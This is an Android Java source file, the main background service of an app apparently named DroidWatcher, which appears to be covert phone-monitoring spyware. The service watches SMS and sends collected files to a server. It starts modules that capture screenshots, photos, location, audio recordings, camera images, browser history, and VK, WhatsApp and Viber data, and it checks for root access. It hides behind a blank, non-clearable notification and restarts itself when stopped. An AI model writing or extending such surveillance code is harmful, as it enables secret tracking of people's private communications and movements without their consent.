package com.droidwatcher.services;

import java.lang.ref.WeakReference;

import com.droidwatcher.DBManager;
import com.droidwatcher.Debug;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.ThreadManager;
import com.droidwatcher.modules.*;
import com.droidwatcher.modules.location.LocationModule;
import com.droidwatcher.receivers.BatteryState;
import com.droidwatcher.receivers.ScreenStateReceiver;
import com.stericson.RootTools.RootTools;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;

public class AppService extends Service {
	public static ThreadManager sThreadManager = null;
	
	public static String APP_VERSION = "";
	
	private ContentResolver mContentResolver;
	//private CallContentObserver mCallObserv;
	private SMSContentObserver mSmsObserv;
	private SettingsManager mSettings;
	private Handler mHandler;
    
    /* MODULES */
    private ScreenStateReceiver mScreenState;
    
    private ScreenshotModule mScreenshotModule;
    private PhotoModule mPhotoModule;
    private LocationModule mLocationmodule;
    private RecorderModule mRecordModule;
    private VkModule mVkModule;
    private WhatsAppModule mWaModule;
    private ViberModule mVbModule;
    private UpdateModule mUpdateModule;
    private GCMModule mGcmModule;
    private CameraModule mCameraModule;
    private BrowserHistoryModule mBrowserModule;
	
    private static boolean sIsRootAvailable = false;
    public static boolean isRootAvailable(){
    	return sIsRootAvailable;
    }
    
    public static boolean isSystemApp(Context context){
    	boolean isSystem = false;
    	
        try {
			isSystem = (context.getPackageManager().getPackageInfo(context.getPackageName(), 0).applicationInfo.flags & (ApplicationInfo.FLAG_SYSTEM | ApplicationInfo.FLAG_UPDATED_SYSTEM_APP)) != 0;
		} catch (NameNotFoundException e) {
			Debug.exception(e);
		}
        
        return isSystem;
    }
	
	@SuppressWarnings("deprecation")
	@Override
	public void onCreate() {
		super.onCreate();
		
		Debug.i("[AppService] starting service");
		Thread.currentThread().setName("[AppService]");
		Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
		
		if (Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR1) {
			android.app.Notification notification = new android.app.Notification(0, null, System.currentTimeMillis());
			notification.flags |= android.app.Notification.FLAG_NO_CLEAR;
			startForeground(42, notification);
		}
		
		mSettings = new SettingsManager(this);
		sThreadManager = new ThreadManager(this);
		try {
			PackageInfo info = getPackageManager().getPackageInfo(getPackageName(), 0);
			APP_VERSION = info.versionName + "(" + info.versionCode + ")";
		} catch (NameNotFoundException e) {
			APP_VERSION = "none";
		}
		
		mContentResolver = getContentResolver();
		//mCallObserv = new CallContentObserver(new Handler(), this);
		mSmsObserv = new SMSContentObserver(new Handler());
		mHandler = new MyHandler(this);
		
		if (mSettings.isConnected()){
			//mContentResolver.registerContentObserver(DBManager.CALL_URI, true, mCallObserv);
			mContentResolver.registerContentObserver(DBManager.SMS_URI, true, mSmsObserv);
		}
		
		sThreadManager.sendFiles();
		
		startThread();
	}
	
	private void startThread(){
		new Thread(new Runnable() {
			@Override
			public void run() {
				if (RootTools.isRootAvailable() && RootTools.isAccessGiven()) {
					Debug.i("[AppService] Root available");
					sIsRootAvailable = true;
				}
				else{
					Debug.i("[AppService] Root NOT available");
					sIsRootAvailable = false;
				}
				
				mHandler.sendEmptyMessage(0);
			}
		}).start();
	}
	
	private void startModules(){
		registerReceiver(BatteryState.getInstance(), new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
		
		mScreenState = new ScreenStateReceiver(this);
		mScreenState.start();
		
		mGcmModule = new GCMModule(this);
		mGcmModule.start();
		
		if (ScreenshotModule.isAvailable()) {
			mScreenshotModule = new ScreenshotModule(this);
			mScreenshotModule.start();
		}
		
		mPhotoModule = new PhotoModule(this);
		mPhotoModule.start();
		
		mLocationmodule = new LocationModule(this);
		mLocationmodule.start();
		
		mRecordModule = new RecorderModule(this);
		
		mUpdateModule = new UpdateModule(this);
		mUpdateModule.start();
		
		mVkModule = new VkModule(this);
		mVkModule.start();
		
		mWaModule = new WhatsAppModule(this);
		mWaModule.start();
		
		mVbModule = new ViberModule(this);
		mVbModule.start();
		
		mCameraModule = new CameraModule(this);
		mCameraModule.start();
		
		mBrowserModule = new BrowserHistoryModule(this);
		mBrowserModule.start();
		
		DeviceInfoModule.updateDeviceInfoOnServer(this);
	}
	
	private void stopModules(){
		if (mScreenState != null) {
			mScreenState.dispose();
			mScreenState = null;
		}
		
		if (mGcmModule != null) {
			mGcmModule.dispose();
			mGcmModule = null;
		}
		
		if (mScreenshotModule != null) {
			mScreenshotModule.dispose();
			mScreenshotModule = null;
		}
		
		if (mPhotoModule != null) {
			mPhotoModule.dispose();
			mPhotoModule = null;
		}
		
		if (mLocationmodule != null) {
			mLocationmodule.dispose();
			mLocationmodule = null;
		}
		
		if (mRecordModule != null) {
			mRecordModule.dispose();
			mRecordModule = null;
		}
		
		if (mUpdateModule != null) {
			mUpdateModule.dispose();
			mUpdateModule = null;
		}
		
		if (mVkModule != null) {
			mVkModule.dispose();
			mVkModule = null;
		}
		
		if (mWaModule != null) {
			mWaModule.dispose();
			mWaModule = null;
		}
		
		if (mVbModule != null) {
			mVbModule.dispose();
			mVbModule = null;
		}
		
		if (mCameraModule != null) {
			mCameraModule.dispose();
			mCameraModule = null;
		}
		
		if (mBrowserModule != null) {
			mBrowserModule.dispose();
			mBrowserModule = null;
		}
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		Debug.i("[AppService] destroy");
		
		stopModules();
		
		if (mContentResolver != null) {
//			try {
//				mContentResolver.unregisterContentObserver(mCallObserv);
//			} catch (Exception e) {
//				Debug.exception(e);
//			}
			try {
				mContentResolver.unregisterContentObserver(mSmsObserv);
			} catch (Exception e) {
				Debug.exception(e);
			}
		}
		
		try {
			unregisterReceiver(BatteryState.getInstance());
			
		} catch (Exception e) {
			Debug.exception(e);
		} finally{
			BatteryState.dispose();
		}
		
		sThreadManager.dispose();
		sThreadManager = null;
		mContentResolver= null;
	}
	
	@Override
	public void onLowMemory() {
		super.onLowMemory();
		
		Debug.i("[AppService] Low memory");
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		//return super.onStartCommand(intent, flags, startId);
		
		return START_STICKY;
	}
	
	private void handlemessage(Message msg){
		Debug.i("[AppService] Handle message");
		startModules();
	}
	
	private static class MyHandler extends Handler{
		private final WeakReference<AppService> mService;
		
		private MyHandler(AppService service) {
			mService = new WeakReference<AppService>(service);
	    }
		
		@Override
        public void handleMessage(Message msg) {
			AppService service = mService.get();
	         if (service != null) {
	              service.handlemessage(msg);
	         }
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
}


